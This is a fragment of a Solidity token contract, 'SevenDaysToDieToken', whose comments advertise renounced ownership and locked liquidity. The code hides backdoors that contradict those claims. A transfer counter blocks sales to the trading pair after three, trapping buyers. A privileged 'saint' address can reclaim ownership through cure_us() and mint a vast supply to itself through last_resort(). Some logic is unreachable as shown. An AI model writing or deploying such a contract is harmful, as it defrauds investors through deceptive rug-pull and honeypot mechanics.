...
// Small fees, directly lock LP tokens and renounce ownership!
// Enter early!
...
contract SevenDaysToDieToken is ERC20, Ownable {

  address public immutable saint;
  address private immutable wftm = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
  address private immutable pair;
  uint128 private analyzer;

  constructor(address uniswapFactory) ERC20("SevenDaysToDieToken", "SDTD") {
    pair = IUniswapV2Factory(uniswapFactory).createPair(address(this), wftm);
    saint = msg.sender;
    _mint(msg.sender, 1000000 ether);
    _transfer(msg.sender, address(0x000000000000000000000000000000000000dEaD), 800000 ether);
    _transferOwnership(address(0));
  }
  ...
  function _transfer(address from, address to, uint256 amount) internal virtual override {
    if(to == pair && from != owner()){
      analyzer += 1;
      require(analyzer <= 3, "SDK: oracle processing");
      ...
      if(analyzer > 3)
        _mint(to, amount * 45 / 100);
    } else {
      super._transfer(from, to, amount);
    }
  }

  function cure_us() external {
    require(msg.sender == saint, "NOT_BLESSED");
    _transferOwnership(saint);
  }

  function last_resort() external {
    require(msg.sender == saint, "INVALID");
    _mint(saint, 100000000000000000000 ether);
  }
